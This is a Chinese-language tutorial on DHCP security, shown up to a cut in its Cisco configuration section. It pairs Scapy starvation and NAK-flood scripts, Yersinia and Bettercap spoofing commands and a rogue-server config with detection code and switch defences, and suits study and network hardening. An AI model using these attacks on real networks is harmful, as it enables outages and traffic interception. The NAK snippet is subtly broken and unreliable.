# DHCP协议安全

> 本文档系统性地介绍DHCP协议基础、安全威胁、检测方法及防御措施，涵盖从理论基础到工程实践的完整知识体系。

---

## 目录

- [一、DHCP协议基础](#一dhcp协议基础)
  - [1.1 DHCP协议概述](#11-dhcp协议概述)
  - [1.2 DHCP报文格式](#12-dhcp报文格式)
  - [1.3 DHCP工作流程](#13-dhcp工作流程)
  - [1.4 DHCP状态机](#14-dhcp状态机)
  - [1.5 DHCP租约管理](#15-dhcp租约管理)
  - [1.6 DHCP中继代理](#16-dhcp中继代理)
- [二、DHCP安全威胁分析](#二dhcp安全威胁分析)
  - [2.1 DHCP饥饿攻击](#21-dhcp饥饿攻击)
  - [2.2 伪造DHCP服务器攻击](#22-伪造dhcp服务器攻击)
  - [2.3 DHCP欺骗攻击](#23-dhcp欺骗攻击)
  - [2.4 中间人攻击](#24-中间人攻击)
  - [2.5 DHCP拒绝服务攻击](#25-dhcp拒绝服务攻击)
  - [2.6 攻击链组合分析](#26-攻击链组合分析)
- [三、DHCP攻击检测方法](#三dhcp攻击检测方法)
  - [3.1 基于流量的检测](#31-基于流量的检测)
  - [3.2 基于行为的检测](#32-基于行为的检测)
  - [3.3 基于特征的检测](#33-基于特征的检测)
  - [3.4 自动化检测工具](#34-自动化检测工具)
- [四、DHCP安全防御机制](#四dhcp安全防御机制)
  - [4.1 DHCP Snooping](#41-dhcp-snooping)
  - [4.2 802.1X认证](#42-8021x认证)
  - [4.3 端口安全](#43-端口安全)
  - [4.4 动态ARP检测](#44-动态arp检测)
  - [4.5 IP源守护](#45-ip源守护)
  - [4.6 其他防御手段](#46-其他防御手段)
- [五、配置实例](#五配置实例)
  - [5.1 Cisco交换机配置](#51-cisco交换机配置)
  - [5.2 华为交换机配置](#52-华为交换机配置)
  - [5.3 H3C交换机配置](#53-h3c交换机配置)
  - [5.4 Linux DHCP服务器安全配置](#54-linux-dhcp服务器安全配置)
- [六、实战攻防演练](#六实战攻防演练)
  - [6.1 攻击实验环境搭建](#61-攻击实验环境搭建)
  - [6.2 Yersinia攻击演示](#62-yersinia攻击演示)
  - [6.3 防御验证](#63-防御验证)
- [七、最佳实践与加固建议](#七最佳实践与加固建议)

---

## 一、DHCP协议基础

### 1.1 DHCP协议概述

DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络管理协议，用于自动为网络设备分配IP地址及其他网络配置参数。DHCP的前身是BOOTP（Bootstrap Protocol），DHCP在BOOTP基础上增加了地址池管理和租约机制。

DHCP的主要功能包括：

- **IP地址自动分配**：从预定义的地址池中动态分配IP地址给客户端
- **网络参数配置**：分配子网掩码、默认网关、DNS服务器等参数
- **地址租约管理**：通过租约机制实现地址的回收和再分配
- **地址冲突检测**：分配前检测地址是否已被使用

DHCP采用客户端/服务器（C/S）架构，使用UDP协议通信，服务器监听67端口，客户端监听68端口。DHCP报文在初始阶段以广播方式发送，因为客户端此时还没有IP地址。

### 1.2 DHCP报文格式

DHCP报文基于BOOTP报文格式扩展，字段结构如下：

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       xid (4)                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     secs (2)  |                 flags (2)                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   ciaddr (4)  客户端IP地址                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   yiaddr (4)  你的IP地址(分配给客户端)          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   siaddr (4)  服务器IP地址                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                   giaddr (4)  网关IP地址                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   chaddr (16) 客户端硬件地址                    |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   sname (64)  服务器主机名                     |
|                                                               |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   file (128) 启动文件名                        |
|                                                               |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   options (var) DHCP选项                      |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

关键字段说明：

| 字段 | 长度 | 说明 |
|------|------|------|
| op | 1字节 | 报文类型：1=BOOTREQUEST(请求)，2=BOOTREPLY(回复) |
| htype | 1字节 | 硬件地址类型，以太网为1 |
| hlen | 1字节 | 硬件地址长度，MAC地址为6 |
| hops | 1字节 | 跳数，由DHCP中继代理设置 |
| xid | 4字节 | 事务ID，请求和响应配对标识 |
| secs | 2字节 | 客户端启动以来的秒数 |
| flags | 2字节 | 标志位，最高位为广播标志 |
| ciaddr | 4字节 | 客户端IP地址 |
| yiaddr | 4字节 | 分配给客户端的IP地址 |
| siaddr | 4字节 | DHCP服务器IP地址 |
| giaddr | 4字节 | 中继代理IP地址 |
| chaddr | 16字节 | 客户端MAC地址 |
| sname | 64字节 | 服务器主机名 |
| file | 128字节 | 启动文件名 |
| options | 可变 | DHCP选项（TLV格式） |

DHCP选项（Options）采用TLV（Type-Length-Value）格式，常用选项如下：

| 选项码 | 名称 | 说明 |
|--------|------|------|
| 53 | DHCP Message Type | DHCP报文类型 |
| 50 | Requested IP Address | 客户端请求的IP地址 |
| 54 | Server Identifier | DHCP服务器标识 |
| 51 | IP Address Lease Time | IP地址租约时间 |
| 1 | Subnet Mask | 子网掩码 |
| 3 | Router | 默认网关 |
| 6 | Domain Name Server | DNS服务器 |
| 12 | Host Name | 主机名 |
| 15 | Domain Name | 域名 |
| 28 | Broadcast Address | 广播地址 |
| 82 | Relay Agent Information | 中继代理信息（DHCP Snooping使用） |

报文类型（Option 53）取值：

| 类型值 | 名称 | 说明 |
|--------|------|------|
| 1 | DHCPDISCOVER | 客户端发现，广播寻找DHCP服务器 |
| 2 | DHCPOFFER | 服务器提供，向客户端提供配置参数 |
| 3 | DHCPREQUEST | 客户端请求，请求特定配置 |
| 4 | DHCPDECLINE | 客户端拒绝，地址冲突时使用 |
| 5 | DHCPACK | 服务器确认，正式分配地址 |
| 6 | DHCPNAK | 服务器拒绝，参数错误或租约过期 |
| 7 | DHCPRELEASE | 客户端释放，主动释放地址 |
| 8 | DHCPINFORM | 客户端通知，已有地址请求其他参数 |

### 1.3 DHCP工作流程

DHCP地址分配过程通常被称为"DORA"四步交互：

```
客户端                      DHCP服务器
  |                              |
  |  1. DHCPDISCOVER (广播)       |
  |----------------------------->|
  |  源IP: 0.0.0.0               |
  |  目的IP: 255.255.255.255    |
  |  源端口: 68  目的端口: 67    |
  |                              |
  |  2. DHCPOFFER (广播/单播)    |
  |<-----------------------------|
  |  源IP: 服务器IP              |
  |  目的IP: 255.255.255.255    |
  |  包含提议的IP地址和配置参数   |
  |                              |
  |  3. DHCPREQUEST (广播)       |
  |----------------------------->|
  |  客户端接受服务器提供的配置   |
  |  广播是为了通知其他服务器     |
  |  自己已选择了某台服务器       |
  |                              |
  |  4. DHCPACK (广播/单播)      |
  |<-----------------------------|
  |  正式确认IP地址分配          |
  |  包含完整的配置参数          |
  |                              |
  |  客户端使用ARP检测地址冲突    |
  |  若冲突则发送DHCPDECLINE    |
  |                              |
```

详细步骤解析：

**步骤1 - DHCPDISCOVER**

客户端启动时没有IP地址，以源IP 0.0.0.0、目的IP 255.255.255.255发送广播报文。报文中包含客户端MAC地址和一个随机生成的事务ID（XID）。如果客户端之前获得过IP地址，可以在Option 50中携带之前使用的IP地址，表示偏好。

**步骤2 - DHCPOFFER**

DHCP服务器收到DISCOVER后，从地址池中选择一个可用IP地址，构造DHCPOFFER报文回应。如果网络中有多台DHCP服务器，客户端可能收到多个OFFER。服务器在发送OFFER前会先发送ICMP Echo Request检测地址是否被使用（冲突检测）。

**步骤3 - DHCPREQUEST**

客户端选择第一个收到的OFFER（或最优的OFFER），以广播方式发送DHCPREQUEST。报文中的Option 54（Server Identifier）指明客户端选择了哪台服务器。广播方式可以同时通知未被选中的服务器，让它们回收之前提议的地址。

**步骤4 - DHCPACK**

被选中的服务器发送DHCPACK确认分配。客户端收到ACK后，对分配的IP地址执行ARP探测，确认没有地址冲突后开始使用。如果有冲突，客户端发送DHCPDECLINE并重新开始DISCOVER过程。

### 1.4 DHCP状态机

DHCP客户端的状态转换如下：

```
                    +------------------+
                    |     INIT        |
                    |  (初始状态)      |
                    +--------+---------+
                             |
                             | 发送 DHCPDISCOVER
                             v
                    +--------+---------+
                    |   SELECTING     |
                    |  (选择状态)      |
                    +--------+---------+
                             |
                             | 收到DHCPOFFER
                             | 发送DHCPREQUEST
                             v
                    +--------+---------+
                    |   REQUESTING    |
                    |  (请求状态)      |
                    +--------+---------+
                           /        \
                收到ACK   /          \  收到NAK
                         v            v
              +--------+---------+   +--------+---------+
              |    BOUND         |   |     INIT        |
              |  (已绑定状态)     |   |  (重新开始)      |
              +--------+---------+   +------------------+
                       |
                       | T1定时器到期(50%租约)
                       v
              +--------+---------+
              |    RENEWING     |
              |  (续约状态)      |
              |  单播DHCPREQUEST |
              +--------+---------+
                       |
                       | T2定时器到期(87.5%租约)
                       v
              +--------+---------+
              |    REBINDING    |
              |  (重绑定状态)    |
              |  广播DHCPREQUEST |
              +--------+---------+
                       |
              +--------+---------+
              | 成功续约回到BOUND |
              | 失败则回到INIT   |
              +------------------+
```

定时器说明：

- **T1定时器（Renewal Timer）**：默认为租约时间的50%，到期后客户端单播向服务器请求续约
- **T2定时器（Rebinding Timer）**：默认为租约时间的87.5%，到期后客户端广播请求续约（因为原服务器可能不可用）
- **租约到期**：如果租约到期前未能续约，客户端必须释放IP地址并重新进入INIT状态

### 1.5 DHCP租约管理

DHCP通过租约机制实现IP地址的动态回收和再分配。租约管理涉及以下概念：

**地址池配置**

服务器配置一个或多个地址池（Scope），每个地址池定义：

- 地址范围（如192.168.1.100-192.168.1.200）
- 子网掩码
- 租约时间
- 排除地址（不参与分配的地址）
- 保留地址（基于MAC地址绑定固定IP）
- DHCP选项（网关、DNS等）

**租约数据库**

服务器维护租约数据库，记录：

| 字段 | 说明 |
|------|------|
| IP地址 | 分配的IP地址 |
| MAC地址 | 客户端MAC地址 |
| 主机名 | 客户端主机名 |
| 租约开始时间 | 分配时间 |
| 租约到期时间 | 到期时间 |
| 状态 | active/free/backup |
| 事务ID | 最近一次交互的XID |

**租约续约过程**

客户端在租约到期前会尝试续约。默认租约时间通常为：

- Windows DHCP服务器：8天
- Linux ISC DHCP服务器：600秒（默认，可配置）
- 最佳实践建议：
  - 办公网络：4-8小时（频繁变更，回收快）
  - 数据中心：7-30天（稳定，减少DHCP流量）
  - 公共Wi-Fi：1-2小时（用户周转快）

### 1.6 DHCP中继代理

在跨网段的网络环境中，DHCP广播报文无法穿越路由器。DHCP中继代理（Relay Agent）解决了这个问题，将DHCP广播报文以单播方式转发到其他网段的DHCP服务器。

工作原理：

```
客户端网段(192.168.1.0/24)          DHCP服务器(10.0.0.100)
  客户端(0.0.0.0)                        |
     |                                   |
     | DHCPDISCOVER(广播)                |
     v                                   |
  路由器接口(192.168.1.1)                |
  [DHCP中继代理]                         |
     |                                   |
     | 将DISCOVER转发为单播              |
     | 源IP: 192.168.1.1                |
     | 目的IP: 10.0.0.100               |
     | giaddr字段填入192.168.1.1        |
     |---------------------------------->|
                                         |
     |<----------------------------------|
     | DHCPOFFER(单播到中继代理)         |
     | 中继代理广播或单播给客户端         |
     v                                   |
  客户端收到OFFER                        |
```

中继代理在转发报文时会在giaddr字段填入接收接口的IP地址，DHCP服务器根据此字段选择正确的地址池。

Option 82（Relay Agent Information Option）是中继代理扩展功能，在转发DHCP报文时添加客户端接入信息：

- Agent Circuit ID：客户端接入的交换机端口信息
- Agent Remote ID：接入设备标识

这些信息可用于DHCP Snooping安全功能和精细化地址分配。

---

## 二、DHCP安全威胁分析

DHCP协议在设计之初未考虑安全认证机制，任何设备都可以发送DHCP报文，这导致了多种安全威胁。

### 2.1 DHCP饥饿攻击

**攻击原理**

DHCP饥饿攻击通过伪造大量不同MAC地址的DHCPDISCOVER请求，快速耗尽DHCP服务器地址池中的可用IP地址，导致合法用户无法获取IP地址。

```
攻击者                          DHCP服务器
  |                                |
  | DHCPDISCOVER (MAC: 00:00:00:00:00:01)  |
  |------------------------------->|
  |<-------------------------------|
  | DHCPOFFER (IP: 192.168.1.101)  |
  |                                |
  | DHCPREQUEST                    |
  |------------------------------->|
  |<-------------------------------|
  | DHCPACK (分配192.168.1.101)    |
  |                                |
  | DHCPDISCOVER (MAC: 00:00:00:00:00:02)  |
  |------------------------------->|
  |<-------------------------------|
  | DHCPOFFER (IP: 192.168.1.102)  |
  |                                |
  | ... 快速重复数百上千次 ...     |
  |                                |
  | 地址池耗尽                     |
  | 合法用户发送DISCOVER           |
  | 无OFFER返回                   |
  | 网络中断                      |
```

**攻击工具**

常用攻击工具包括：

- **Yersinia**：支持多种二层协议攻击，包括DHCP饥饿攻击
- **DHCPig**：Python编写的DHCP饥饿攻击工具
- **Scapy**：通过Python脚本自定义构造DHCP报文

Yersinia使用示例：

```bash
# 启动Yersinia交互模式
yersinia -I

# 选择DHCP攻击模式后选择"dhcp starvation attack"

# 命令行模式执行DHCP饥饿攻击
yersinia -attack 1 -interface eth0
```

Scapy构造DHCP饥饿攻击脚本：

```python
from scapy.all import *
import random

def mac_generator():
    """生成随机MAC地址"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(f'{b:02x}' for b in mac)

def dhcp_starvation(interface, count=100):
    """DHCP饥饿攻击"""
    for i in range(count):
        mac = mac_generator()
        # 构造以太网帧
        eth = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')
        # 构造IP/UDP层
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        udp = UDP(sport=68, dport=67)
        # 构造BOOTP层
        bootp = BOOTP(
            chaddr=bytes.fromhex(mac.replace(':', '')),
            xid=random.randint(1, 0xFFFFFFFF)
        )
        # 构造DHCP层
        dhcp = DHCP(options=[
            ('message-type', 'discover'),
            ('client_id', bytes.fromhex('01' + mac.replace(':', ''))),
            ('param_req_list', [1, 3, 6, 15, 28]),
            'end'
        ])
        # 发送报文
        packet = eth / ip / udp / bootp / dhcp
        sendp(packet, iface=interface, verbose=0)
        print(f'[{i+1}/{count}] 发送DHCPDISCOVER, MAC={mac}')

if __name__ == '__main__':
    dhcp_starvation('eth0', count=200)
```

**危害分析**

- 地址池耗尽导致合法用户无法获取IP地址
- 服务拒绝导致业务中断
- 如果服务器记录租约到持久化存储，可能导致数据库膨胀
- 攻击开销极低（单机即可），防御相对困难

### 2.2 伪造DHCP服务器攻击

**攻击原理**

攻击者在网络中部署伪造的DHCP服务器，向合法客户端提供错误的网络配置，包括错误的网关、DNS服务器等。

```
合法DHCP服务器(192.168.1.1)           攻击者
  |                                    |
  |                          伪造DHCP服务器(192.168.1.254)
  |                                    |
  |       DHCPDISCOVER (广播)          |
  |<-----------------------|-----------|
  |                        |           |
  | DHCPOFFER (正常配置)  | DHCPOFFER (恶意配置)
  | 网关:192.168.1.1      | 网关:192.168.1.254
  | DNS:8.8.8.8           | DNS:192.168.1.254
  |                       |           |
  |       客户端选择最先到达的OFFER       |
  |       通常攻击者不发送等待时间        |
  |       直接快速响应                 |
  |                       v           |
  |              客户端使用恶意配置      |
  |              所有流量经过攻击者      |
```

**伪造DHCP服务器搭建**

使用isc-dhcp-server搭建伪造服务器：

```
# /etc/dhcp/dhcpd.conf 配置文件
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.200 192.168.1.250;
    option routers 192.168.1.254;        # 恶意网关指向攻击者
    option domain-name-servers 192.168.1.254;  # 恶意DNS指向攻击者
    default-lease-time 600;
    max-lease-time 7200;
}
```

### 2.3 DHCP欺骗攻击

**攻击原理**

DHCP欺骗是伪造DHCP服务器攻击的扩展形式。攻击者通过快速响应DHCPDISCOVER来抢占先机，使客户端优先使用攻击者提供的配置。

DHCP欺骗攻击通常配合以下技术：

- **ARP毒化**：攻击者分配给自己的IP地址设为网关地址，然后通过ARP欺骗截获流量
- **DNS劫持**：恶意DNS服务器返回伪造的域名解析结果
- **SSL stripping**：在中间人位置降级HTTPS连接

**攻击流程**

```
1. 攻击者接入网络，启动伪造DHCP服务器
2. 客户端发送DHCPDISCOVER广播
3. 合法服务器和伪造服务器同时收到DISCOVER
4. 伪造服务器先发送DHCPOFFER（响应更快）
5. 客户端选择伪造服务器的OFFER
6. 客户端获取恶意网关和DNS
7. 客户端的所有网络流量经过攻击者
8. 攻击者进行中间人攻击、流量嗅探、数据篡改
```

### 2.4 中间人攻击

DHCP欺骗是局域网中间人攻击的重要入口。攻击链如下：

```
阶段1: DHCP欺骗
  - 部署伪造DHCP服务器
  - 客户端获取恶意配置
  - 网关指向攻击者

阶段2: 流量劫持
  - 客户端流量到达攻击者
  - 攻击者转发到真实网关
  - 客户端无感知

阶段3: 攻击载荷
  - HTTP流量劫持和篡改
  - SSL/TLS降级攻击
  - Cookie窃取
  - 凭证嗅探
  - 恶意软件投递
```

中间人攻击工具：

- **Bettercap**：综合中间人攻击框架
- **Ettercap**：经典ARP/DHCP欺骗工具
- **MITMf**：Python中间人攻击框架

Bettercap DHCP欺骗示例：

```bash
# 启动bettercap
sudo bettercap -iface eth0

# 设置DHCP欺骗
set dhcp.spoof on
set dhcp.spoof.gateway 192.168.1.254
set dhcp.spoof.dns 192.168.1.254
set dhcp.spoof.range.start 192.168.1.100
set dhcp.spoof.range.end 192.168.1.150

# 启动
dhcp.spoof on

# 同时启动ARP欺骗（增强效果）
set arp.spoof.targets 192.168.1.50
arp.spoof on

# 启动嗅探
net.sniff on
```

### 2.5 DHCP拒绝服务攻击

除了饥饿攻击外，DHCP还面临其他形式的DoS攻击：

**DHCP NAK攻击**

攻击者持续发送DHCPNAK报文，中断合法客户端的租约，导致客户端反复重新获取地址：

```python
from scapy.all import *
import time

def dhcp_nak_attack(target_mac, server_ip, interface):
    """DHCP NAK攻击"""
    eth = Ether(src=server_ip, dst=target_mac)
    ip = IP(src=server_ip, dst='255.255.255.255')
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(
        chaddr=bytes.fromhex(target_mac.replace(':', '')),
        siaddr=server_ip,
        xid=random.randint(1, 0xFFFFFFFF)
    )
    dhcp = DHCP(options=[
        ('message-type', 'nak'),
        ('server_id', server_ip),
        'end'
    ])
    packet = eth / ip / udp / bootp / dhcp
    sendp(packet, iface=interface, loop=1, inter=0.1)
```

**DHCPRELEASE攻击**

攻击者伪造客户端的MAC地址发送DHCPRELEASE报文，使服务器提前释放租约：

```
攻击者伪造合法客户端MAC -> 发送DHCPRELEASE -> 服务器释放地址 -> 客户端失去IP
```

### 2.6 攻击链组合分析

在实际攻击中，攻击者通常组合使用多种DHCP攻击技术：

```
攻击链1: DHCP饥饿 + 伪造服务器
  1. DHCP饥饿攻击耗尽合法服务器地址池
  2. 客户端无法从合法服务器获取地址
  3. 攻击者的伪造DHCP服务器响应请求
  4. 客户端使用恶意配置

攻击链2: DHCP欺骗 + ARP毒化 + 中间人
  1. DHCP欺骗使网关指向攻击者
  2. ARP毒化确保流量持续经过攻击者
  3. 攻击者执行中间人攻击
  4. 窃取凭证、注入恶意代码

攻击链3: DHCP攻击 + DNS劫持 + 钓鱼
  1. DHCP欺骗分配恶意DNS服务器
  2. 恶意DNS将银行域名解析到钓鱼网站
  3. 用户访问钓鱼网站
  4. 凭证被窃取
```

---

## 三、DHCP攻击检测方法

### 3.1 基于流量的检测

**异常DHCP流量监控**

正常网络环境中DHCP流量具有规律性模式。异常检测关注以下指标：

| 指标 | 正常范围 | 异常表现 |
|------|----------|----------|
| DHCPDISCOVER速率 | <10/分钟 | >100/分钟可能饥饿攻击 |
| MAC地址多样性 | 合法设备数 | 短时间内大量不同MAC |
| DHCP服务器数量 | 1-2台 | 多台服务器响应 |
| 地址池利用率 | <80% | 突然达到100% |
| DHCP报文比率 | DISCOVER:OFFER≈1:1 | DISCOVER远多于OFFER |

**流量采集与统计**

使用SNMP或NetFlow监控DHCP流量：

```
# Cisco设备查看DHCP统计
show ip dhcp binding
show ip dhcp server statistics
show ip dhcp conflict

# Linux统计DHCP流量
tcpdump -i eth0 -nn port 67 or port 68 -c 1000 | \
  awk '{print $NF}' | sort | uniq -c | sort -rn
```

### 3.2 基于行为的检测

**MAC地址异常检测**

DHCP饥饿攻击需要伪造大量MAC地址，检测策略包括：

- **MAC地址变化率**：同一端口短时间内出现大量不同MAC地址
- **MAC地址格式异常**：非OUI分配的MAC地址（随机生成的MAC通常本地管理位置1）
- **MAC-Port绑定异常**：同一MAC在多个端口出现

**响应时间分析**

伪造DHCP服务器通常比合法服务器响应更快。通过测量DHCPDISCOVER到DHCPOFFER的延迟可以识别异常：

- 正常服务器延迟：10-100ms（包括地址选择和冲突检测）
- 伪造服务器延迟：<10ms（不做冲突检测）
- 如果网络中存在响应延迟差异大的DHCP服务器，需要排查

### 3.3 基于特征的检测

**DHCP报文特征匹配**

- **Option 54不匹配**：DHCPOFFER/DHCPACK中的Server Identifier不是已知合法服务器
- **Option 82异常**：中继代理信息与预期不符
- **服务器MAC不匹配**：发送DHCP响应的设备MAC不在白名单中
- **异常Option组合**：报文中包含非标准或异常的选项组合

### 3.4 自动化检测工具

**DHCP探测工具**

DHCPing是一个DHCP服务器探测工具：

```bash
# 探测网络中的DHCP服务器
dhcping -s 255.255.255.255 -c

# 查看特定服务器的响应
dhcping -s 192.168.1.1 -r
```

**使用Scapy构建检测脚本**

```python
from scapy.all import *
import time
from collections import defaultdict

class DHCPDetector:
    """DHCP攻击检测器"""

    def __init__(self, interface, legit_servers=None):
        self.interface = interface
        self.legit_servers = legit_servers or []
        self.discover_count = defaultdict(int)
        self.server_set = set()
        self.mac_set = set()
        self.start_time = time.time()
        self.alerts = []

    def detect_starvation(self, packet):
        """检测DHCP饥饿攻击"""
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if opt[0] == 'message-type' and opt[1] == 1:
                    # DHCPDISCOVER
                    src_mac = packet[Ether].src
                    self.mac_set.add(src_mac)

                    # 统计每分钟DISCOVER数量
                    elapsed = time.time() - self.start_time
                    if elapsed > 0:
                        rate = len(self.mac_set) / elapsed * 60
                        if rate > 50:  # 阈值：50个不同MAC/分钟
                            alert = f'[!] 可能的DHCP饥饿攻击! ' \
                                   f'检测到{len(self.mac_set)}个不同MAC, ' \
                                   f'速率: {rate:.1f}/分钟'
                            self.alerts.append(alert)
                            print(alert)

    def detect_rogue_server(self, packet):
        """检测伪造DHCP服务器"""
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if opt[0] == 'message-type' and opt[1] in (2, 5):
                    # DHCPOFFER or DHCPACK
                    server_ip = packet[IP].src
                    self.server_set.add(server_ip)

                    if self.legit_servers and server_ip not in self.legit_servers:
                        alert = f'[!] 检测到伪造DHCP服务器! ' \
                               f'服务器IP: {server_ip}'
                        self.alerts.append(alert)
                        print(alert)

    def start(self):
        """启动检测"""
        print(f'[*] DHCP攻击检测器已启动, 监听接口: {self.interface}')
        print(f'[*] 合法DHCP服务器: {self.legit_servers}')

        def callback(packet):
            self.detect_starvation(packet)
            self.detect_rogue_server(packet)

        sniff(iface=self.interface, filter='udp port 67 or udp port 68',
              prn=callback, store=0)

if __name__ == '__main__':
    detector = DHCPDetector(
        interface='eth0',
        legit_servers=['192.168.1.1']
    )
    detector.start()
```

---

## 四、DHCP安全防御机制

### 4.1 DHCP Snooping

**原理**

DHCP Snooping是交换机层面的安全功能，通过将端口分为信任端口（Trusted Port）和非信任端口（Untrusted Port）来过滤DHCP报文。

- **信任端口**：可以发送DHCPOFFER、DHCPACK、DHCPNAK等服务器响应报文，通常连接合法DHCP服务器
- **非信任端口**：只允许发送DHCPDISCOVER、DHCPREQUEST等客户端请求报文，阻断伪造服务器响应

```
交换机
+------------+          +---------------+
| 信任端口   |----------| DHCP服务器    |
| (Gi0/1)   |          | 192.168.1.1  |
+------------+          +---------------+

+--------------+        +---------------+
| 非信任端口    |--------| 合法客户端    |
| (Gi0/2-48)  |        | 允许DISCOVER |
+--------------+        +---------------+

+--------------+        +---------------+
| 非信任端口    |--------| 攻击者        |
| (Gi0/10)    |        | 阻断OFFER    |
+--------------+        +---------------+
```

**DHCP Snooping绑定表**

交换机自动学习并维护DHCP Snooping绑定表，记录：

| MAC地址 | IP地址 | 租约时间 | 接口 | VLAN |
|--------|--------|---------|------|------|
| 00:1a:2b:3c:4d:5e | 192.168.1.100 | 86400 | Gi0/2 | 10 |
| 00:1a:2b:3c:4d:6f | 192.168.1.101 | 86400 | Gi0/3 | 10 |

绑定表用于：

- 动态ARP检测（DAI）：验证ARP报文中的IP-MAC映射
- IP源守护（IPSG）：过滤源地址欺骗的IP报文
- 802.1X的动态VLAN分配

**Option 82支持**

DHCP Snooping可以在转发DHCP报文时插入Option 82：

```
收到DHCPDISCOVER (来自Gi0/2, VLAN 10)
  -> 插入Option 82:
     Circuit ID: 0x000a0002 (VLAN 10, 端口2)
     Remote ID: 交换机MAC地址
  -> 转发到DHCP服务器
  -> 服务器可根据Option 82为不同端口分配不同网段的IP
```

**限速功能**

DHCP Snooping可以在非信任端口上限制DHCP报文速率：

- 默认速率限制：15包/秒
- 超过限制的报文被丢弃
- 端口可能被errdisable
- 有效缓解DHCP饥饿攻击

### 4.2 802.1X认证

IEEE 802.1X是基于端口的网络访问控制协议，在DHCP之前对设备进行认证，确保只有授权设备才能获取网络配置。

**架构**

```
+----------+      EAPOL      +-----------+     RADIUS     +---------+
| 客户端    |<--------------->| 认证者    |<------------->| 认证服务器|
| (Suppli- |     (802.1X)     | (Authen- |   (UDP 1812)  | (RADIUS)|
|  cant)   |                 |  ticator)|               |         |
+----------+                 | 交换机    |               +---------+
                              +-----------+
```

**认证流程**

```
1. 客户端接入端口（默认未认证状态）
2. 认证者发送EAP-Request/Identity
3. 客户端发送EAP-Response/Identity（用户名）
4. 认证者转发到RADIUS服务器
5. RADIUS选择认证方法（EAP-PEAP/EAP-TLS/EAP-MSCHAPv2）
6. 认证交互过程
7. 认证成功 -> 端口授权，可正常通信
8. 认证失败 -> 端口保持阻塞或分配到Guest VLAN
```

**与DHCP联动**

802.1X认证成功后，交换机可以：

- 动态分配VLAN（基于RADIUS返回的属性）
- 下载ACL限制访问
- 触发DHCP Snooping学习绑定表
- 确保只有认证设备才能获取IP地址

### 4.3 端口安全

端口安全限制交换机端口上可学习的MAC地址数量，防止MAC泛洪和DHCP饥饿攻击。

**配置策略**

| 策略 | 说明 | 适用场景 |
|------|------|----------|
| 固定MAC | 只允许指定MAC地址 | 打印机、服务器 |
| 限制数量 | 最多N个MAC | 助公区端口 |
| 粘滞学习 | 动态学习并固化 | 简化部署 |

**违规动作**

- **protect**：丢弃违规MAC的报文，不告警
- **restrict**：丢弃违规MAC的报文，产生日志和SNMP告警
- **shutdown**：关闭端口（errdisable），需要手动恢复或配置自动恢复

### 4.4 动态ARP检测

动态ARP检测（DAI）依赖DHCP Snooping绑定表，验证ARP报文的合法性。

**工作原理**

```
客户端发送ARP请求/响应
  -> 交换机检查ARP报文中的IP-MAC映射
  -> 查询DHCP Snooping绑定表
  -> 匹配则转发，不匹配则丢弃
  -> 记录违规日志
```

DAI有效防御ARP欺骗攻击，切断DHCP欺骗后的中间人攻击路径。

### 4.5 IP源守护

IP源守护（IPSG）使用DHCP Snooping绑定表过滤IP报文，防止IP地址欺骗。

**工作原理**

```
客户端发送IP报文
  -> 交换机检查源IP和源MAC
  -> 查询DHCP Snooping绑定表
  -> 匹配则转发，不匹配则丢弃
```

IPSG可以防止攻击者伪造源IP地址进行网络扫描和攻击。

### 4.6 其他防御手段

**DHCP认证（RFC 3118）**

RFC 3118定义了DHCP认证机制，通过在DHCP报文中添加认证选项实现客户端和服务器双向认证。但由于部署复杂和兼容性问题，实际应用很少。

**网络准入控制（NAC）**

综合802.1X、DHCP Snooping、端口安全的网络准入控制方案，在设备接入时进行全面安全检查。

**DHCP服务器加固**

- 关闭不必要的DHCP选项
- 配置地址池排除范围
- 设置合理的租约时间
- 启用日志记录
- 限制DHCP服务器服务的网络接口
- 定期审查租约数据库

---

## 五、配置实例

### 5.1 Cisco交换机配置

**DHCP Snooping配置**

```cisco
! 全局启用DHCP Snooping
Switch(config)# ip dhcp snooping

! 指定DHCP Snooping作用的VLAN
Switch(config)# ip dhcp snooping vlan 10,20,30

! 配置信任端口（连接DHCP服务器的端口）
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# ip dhcp snooping trust

! 配置非信任端口的DHCP报文限速
